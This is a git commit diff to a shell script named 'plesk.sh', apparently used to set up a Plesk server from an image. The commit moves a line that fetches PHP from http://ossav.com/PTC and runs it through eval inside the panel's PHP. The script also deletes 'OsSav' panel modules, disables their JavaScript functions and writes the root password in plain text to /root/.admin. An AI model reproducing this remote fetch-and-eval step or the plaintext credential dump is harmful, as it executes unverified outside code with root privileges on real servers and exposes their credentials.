51de107bd388ab99acede6d228fc9cb8ad79d9db
it-toppp <36742579+it-toppp@users.noreply.github.com>
2022-10-23 18:37:49 +0300

    Update plesk.sh

--- plesk.sh
+++ plesk.sh
@@ -3,6 +3,8 @@
 domain=$1
 password=$2
 IP=$(wget -O - -q ifconfig.me)
+ln -s /opt/plesk/php/7.4/lib /opt/plesk/php/7.4/lib64
+/usr/sbin/plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
 /usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
 cat > /root/ip_map_file << HERE
 eth0 79.133.56.100 255.255.255.0 -> eth0 $IP 255.255.255.0
@@ -12,8 +14,7 @@ HERE
 /etc/init.d/sw-cp-server restart
 /etc/init.d/sw-engine restart
 /usr/local/psa/bin/init_conf -u -passwd $password
-/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file -drop-if-exists
-/usr/sbin/plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
+#
 rm -fr /usr/local/psa/admin/plib/modules/OsSav
 rm -fr /usr/local/psa/admin/htdocs/modules/OsSav
 replace 'function OsSav_' '//function OsSav_' -- /usr/local/psa/admin/cp/public/javascript/main.js
@@ -29,4 +30,3 @@ SSH:
    username: root
    password: $password
 " | tee -a /root/.admin
-}
